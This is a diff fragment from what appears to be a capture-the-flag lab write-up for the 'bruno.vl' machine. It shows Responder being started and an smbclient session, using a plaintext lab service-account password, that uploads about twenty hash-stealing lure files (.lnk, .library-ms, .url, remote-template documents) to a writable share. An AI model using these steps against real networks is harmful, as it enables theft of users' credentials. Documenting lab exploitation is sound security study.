@@ -282,5 +282,33 @@ Generation Complete.
 This generated files that ill plant in the SMB share
 
 ```python
+sudo responder -I tun0
+```
 
+```python
+smbclient //brunodc.bruno.vl/queue -U 'svc_net'%'Sunshine1'
+Try "help" to get a list of possible commands.
+smb: \> prompt off
+smb: \> mput meeting*
+putting file meeting-(externalcell).xlsx as \meeting-(externalcell).xlsx (121.7 kB/s) (average 121.7 kB/s)
+putting file meeting.library-ms as \meeting.library-ms (27.7 kB/s) (average 76.8 kB/s)
+putting file meeting.lnk as \meeting.lnk (48.0 kB/s) (average 67.3 kB/s)
+putting file meeting.m3u as \meeting.m3u (1.1 kB/s) (average 51.0 kB/s)
+putting file meeting-(frameset).docx as \meeting-(frameset).docx (203.7 kB/s) (average 83.9 kB/s)
+putting file meeting-(remotetemplate).docx as \meeting-(remotetemplate).docx (427.8 kB/s) (average 155.8 kB/s)
+putting file meeting.rtf as \meeting.rtf (2.3 kB/s) (average 135.4 kB/s)
+putting file meeting.htm as \meeting.htm (1.8 kB/s) (average 120.4 kB/s)
+putting file meeting-(handler).htm as \meeting-(handler).htm (2.5 kB/s) (average 107.9 kB/s)
+putting file meeting.application as \meeting.application (35.8 kB/s) (average 100.9 kB/s)
+putting file meeting.theme as \meeting.theme (36.8 kB/s) (average 95.3 kB/s)
+putting file meeting-(url).url as \meeting-(url).url (1.2 kB/s) (average 87.5 kB/s)
+putting file meeting.pdf as \meeting.pdf (16.3 kB/s) (average 82.0 kB/s)
+putting file meeting.asx as \meeting.asx (3.3 kB/s) (average 76.7 kB/s)
+putting file meeting-(stylesheet).xml as \meeting-(stylesheet).xml (3.7 kB/s) (average 72.2 kB/s)
+putting file meeting-(icon).url as \meeting-(icon).url (2.4 kB/s) (average 67.9 kB/s)
+putting file meeting.wax as \meeting.wax (1.3 kB/s) (average 64.2 kB/s)
+putting file meeting.jnlp as \meeting.jnlp (4.4 kB/s) (average 61.1 kB/s)
+putting file meeting-(fulldocx).xml as \meeting-(fulldocx).xml (854.0 kB/s) (average 134.4 kB/s)
+putting file meeting-(includepicture).docx as \meeting-(includepicture).docx (212.3 kB/s) (average 138.3 kB/s)
+smb: \> 
 ```
